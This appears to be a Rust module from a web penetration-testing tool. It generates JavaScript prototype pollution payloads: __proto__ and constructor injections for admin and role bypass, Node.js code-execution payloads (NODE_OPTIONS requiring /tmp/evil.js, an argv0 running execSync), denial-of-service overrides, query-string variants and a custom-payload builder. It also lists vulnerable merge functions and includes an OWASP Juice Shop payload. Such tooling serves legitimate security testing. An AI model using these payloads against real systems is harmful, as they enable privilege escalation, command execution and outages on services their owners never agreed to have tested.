//! Prototype Pollution payload generation
//!
//! Provides payloads for JavaScript prototype pollution attacks.
//! These attacks modify Object.prototype to inject malicious properties.

use serde_json::{json, Value};

/// Prototype pollution payload
#[derive(Debug, Clone)]
pub struct PrototypePollutionPayload {
    pub name: String,
    pub payload: Value,
    pub payload_string: String,
    pub category: PollutionCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum PollutionCategory {
    PropertyInjection,
    Rce,
    Dos,
    AuthBypass,
    XssTrigger,
}

impl PrototypePollutionPayload {
    pub fn new(name: &str, payload: Value, category: PollutionCategory) -> Self {
        Self {
            name: name.to_string(),
            payload_string: payload.to_string(),
            payload,
            category,
        }
    }
}

/// Basic prototype pollution payloads
pub fn basic_payloads() -> Vec<PrototypePollutionPayload> {
    vec![
        // __proto__ based
        PrototypePollutionPayload::new(
            "__proto__ property injection",
            json!({"__proto__": {"polluted": true}}),
            PollutionCategory::PropertyInjection,
        ),
        PrototypePollutionPayload::new(
            "__proto__ admin",
            json!({"__proto__": {"admin": true, "isAdmin": true}}),
            PollutionCategory::AuthBypass,
        ),
        PrototypePollutionPayload::new(
            "__proto__ role",
            json!({"__proto__": {"role": "admin"}}),
            PollutionCategory::AuthBypass,
        ),
        // constructor.prototype based
        PrototypePollutionPayload::new(
            "constructor.prototype",
            json!({"constructor": {"prototype": {"polluted": true}}}),
            PollutionCategory::PropertyInjection,
        ),
        // Nested __proto__
        PrototypePollutionPayload::new(
            "Nested __proto__",
            json!({"a": {"__proto__": {"polluted": true}}}),
            PollutionCategory::PropertyInjection,
        ),
    ]
}

/// RCE payloads for Node.js environments
pub fn nodejs_rce_payloads() -> Vec<PrototypePollutionPayload> {
    vec![
        PrototypePollutionPayload::new(
            "child_process spawn shell",
            json!({
                "__proto__": {
                    "shell": true,
                    "NODE_OPTIONS": "--require /proc/self/cmdline"
                }
            }),
            PollutionCategory::Rce,
        ),
        PrototypePollutionPayload::new(
            "env injection",
            json!({
                "__proto__": {
                    "env": {
                        "NODE_OPTIONS": "--require /tmp/evil.js"
                    }
                }
            }),
            PollutionCategory::Rce,
        ),
        PrototypePollutionPayload::new(
            "shell env PATH",
            json!({
                "__proto__": {
                    "shell": "/proc/self/exe",
                    "argv0": "console.log(require('child_process').execSync('id').toString())//"
                }
            }),
            PollutionCategory::Rce,
        ),
    ]
}

/// DoS payloads
pub fn dos_payloads() -> Vec<PrototypePollutionPayload> {
    vec![
        PrototypePollutionPayload::new(
            "toString override",
            json!({"__proto__": {"toString": null}}),
            PollutionCategory::Dos,
        ),
        PrototypePollutionPayload::new(
            "valueOf override",
            json!({"__proto__": {"valueOf": null}}),
            PollutionCategory::Dos,
        ),
        PrototypePollutionPayload::new(
            "hasOwnProperty override",
            json!({"__proto__": {"hasOwnProperty": null}}),
            PollutionCategory::Dos,
        ),
        PrototypePollutionPayload::new(
            "constructor override",
            json!({"__proto__": {"constructor": null}}),
            PollutionCategory::Dos,
        ),
    ]
}

/// URL query string payloads
pub fn query_string_payloads() -> Vec<String> {
    vec![
        "__proto__[polluted]=true".to_string(),
        "__proto__.polluted=true".to_string(),
        "constructor[prototype][polluted]=true".to_string(),
        "constructor.prototype.polluted=true".to_string(),
        "__proto__[admin]=true".to_string(),
        "__proto__[isAdmin]=true".to_string(),
        "__proto__[role]=admin".to_string(),
        "a[__proto__][polluted]=true".to_string(),
        "a.__proto__.polluted=true".to_string(),
    ]
}

/// Generate custom pollution payload
pub fn custom_payload(property: &str, value: &Value) -> Value {
    json!({
        "__proto__": {
            property: value
        }
    })
}

/// Generate nested pollution payload
pub fn nested_payload(path: &[&str], value: &Value) -> Value {
    let mut result = value.clone();

    for key in path.iter().rev() {
        result = json!({ *key: result });
    }

    result
}

/// Detection payloads to test for prototype pollution
pub fn detection_payloads() -> Vec<PrototypePollutionPayload> {
    vec![
        PrototypePollutionPayload::new(
            "Random property test",
            json!({"__proto__": {"pp_test_12345": "polluted"}}),
            PollutionCategory::PropertyInjection,
        ),
        PrototypePollutionPayload::new(
            "Length property",
            json!({"__proto__": {"length": 1}}),
            PollutionCategory::PropertyInjection,
        ),
        PrototypePollutionPayload::new(
            "Status property",
            json!({"__proto__": {"status": 200}}),
            PollutionCategory::PropertyInjection,
        ),
    ]
}

/// Common vulnerable functions/libraries
pub fn vulnerable_patterns() -> Vec<VulnerablePattern> {
    vec![
        VulnerablePattern {
            name: "Object.assign".to_string(),
            description: "Deep merge without sanitization".to_string(),
            example: "Object.assign({}, untrusted)".to_string(),
        },
        VulnerablePattern {
            name: "lodash.merge".to_string(),
            description: "Old versions of lodash merge are vulnerable".to_string(),
            example: "_.merge({}, untrusted)".to_string(),
        },
        VulnerablePattern {
            name: "lodash.defaultsDeep".to_string(),
            description: "Deep defaults assignment".to_string(),
            example: "_.defaultsDeep({}, untrusted)".to_string(),
        },
        VulnerablePattern {
            name: "jQuery.extend".to_string(),
            description: "Deep extend with jQuery".to_string(),
            example: "$.extend(true, {}, untrusted)".to_string(),
        },
        VulnerablePattern {
            name: "Recursive object copy".to_string(),
            description: "Custom recursive copy functions".to_string(),
            example: "deepCopy(target, source)".to_string(),
        },
        VulnerablePattern {
            name: "JSON.parse + merge".to_string(),
            description: "Parsing JSON and merging into objects".to_string(),
            example: "merge(config, JSON.parse(userInput))".to_string(),
        },
    ]
}

#[derive(Debug, Clone)]
pub struct VulnerablePattern {
    pub name: String,
    pub description: String,
    pub example: String,
}

/// Juice Shop Kill Chatbot payload
pub fn juice_shop_kill_chatbot() -> PrototypePollutionPayload {
    PrototypePollutionPayload::new(
        "Kill Chatbot (Juice Shop)",
        json!({
            "__proto__": {
                "status": "success",
                "type": "coupon"
            }
        }),
        PollutionCategory::Dos,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_payloads() {
        let payloads = basic_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads
            .iter()
            .any(|p| p.payload_string.contains("__proto__")));
    }

    #[test]
    fn test_query_string_payloads() {
        let payloads = query_string_payloads();
        assert!(payloads.iter().any(|p| p.contains("__proto__")));
    }

    #[test]
    fn test_custom_payload() {
        let payload = custom_payload("admin", &json!(true));
        assert!(payload.to_string().contains("admin"));
    }

    #[test]
    fn test_nested_payload() {
        let payload = nested_payload(&["__proto__", "inner"], &json!(true));
        assert!(payload.to_string().contains("__proto__"));
    }

    #[test]
    fn test_vulnerable_patterns() {
        let patterns = vulnerable_patterns();
        assert!(patterns.iter().any(|p| p.name.contains("lodash")));
    }
}
